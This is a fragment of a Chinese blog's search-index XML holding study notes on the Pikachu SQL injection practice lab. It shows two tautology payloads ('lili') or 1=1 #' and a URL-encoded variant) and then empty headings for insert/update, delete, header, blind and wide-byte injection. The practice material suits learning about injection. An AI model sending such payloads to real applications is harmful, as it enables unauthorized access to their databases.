-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lili&#x27;) or 1=1 #</span><br><span class="line">lili&#x27;) or 1=1 %23</span><br></pre></td></tr></table></figure>
-
-<h3 id="insert-update注入"><a href="#insert-update注入" class="headerlink" title="insert/update注入"></a>insert/update注入</h3><h3 id="delete注入"><a href="#delete注入" class="headerlink" title="delete注入"></a>delete注入</h3><h3 id="http-header注入"><a href="#http-header注入" class="headerlink" title="http header注入"></a>http header注入</h3><h3 id="盲注-Base-On-Boolian"><a href="#盲注-Base-On-Boolian" class="headerlink" title="盲注(Base On Boolian)"></a>盲注(Base On Boolian)</h3><h3 id="盲注-Base-On-Time"><a href="#盲注-Base-On-Time" class="headerlink" title="盲注(Base On Time)"></a>盲注(Base On Time)</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3>]]></content>
-      <tags>
-        <tag>2024</tag>
-        <tag>七月</tag>
-        <tag>靶场</tag>
-        <tag>Pikachu</tag>
       </tags>
   </entry>
 </search>
